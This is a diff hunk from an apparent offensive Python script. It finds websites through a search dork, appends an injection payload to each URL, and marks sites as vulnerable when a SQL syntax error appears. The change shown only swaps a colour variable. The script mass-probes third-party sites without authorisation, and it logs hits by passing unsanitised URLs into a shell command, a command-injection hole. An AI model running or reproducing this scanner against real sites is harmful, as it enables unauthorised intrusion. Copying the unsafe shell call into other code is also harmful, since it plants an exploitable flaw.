@@ -35,7 +35,7 @@ try:
     for url in search(dork):
         req=requests.get(url+payload)
         if 'syntax;' in req.text:
-            print(BlueLight+'['+GreenLight+'✓'+BlueLight+']'+GreenLight+' vuln :',url)
+            print(Blue+'['+GreenLight+'✓'+Blue+']'+GreenLight+' vuln :',url)
             system('echo '+url+' >> vuln.txt')
         else:
             print(Red+'[x] not vuln :',url)
